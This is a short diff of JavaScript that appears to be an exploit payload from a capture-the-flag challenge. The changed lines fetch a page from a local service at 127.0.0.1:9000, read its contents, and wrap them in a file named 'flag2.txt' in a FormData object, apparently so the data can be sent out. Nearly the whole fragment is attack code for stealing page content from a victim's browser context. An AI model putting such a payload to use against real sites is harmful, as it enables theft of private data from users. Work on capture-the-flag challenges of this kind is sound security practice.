@@ -9,11 +9,11 @@ s0.parentNode.insertBefore(s1,s0);
 
 })();
 
-fetch("/view/f1135719-d3a5-4534-9bc1-f7ddcf4c8cb3").then((res) => {
+fetch("http://127.0.0.1:9000/view/f1135719-d3a5-4534-9bc1-f7ddcf4c8cb3").then((res) => {
     return res.text();
   }).then(data => {
 			var formData = new FormData();
-			var file = new File([data], "flag", {
+			var file = new File([data], "flag2.txt", {
 			type: "text/plain",
 		});
 
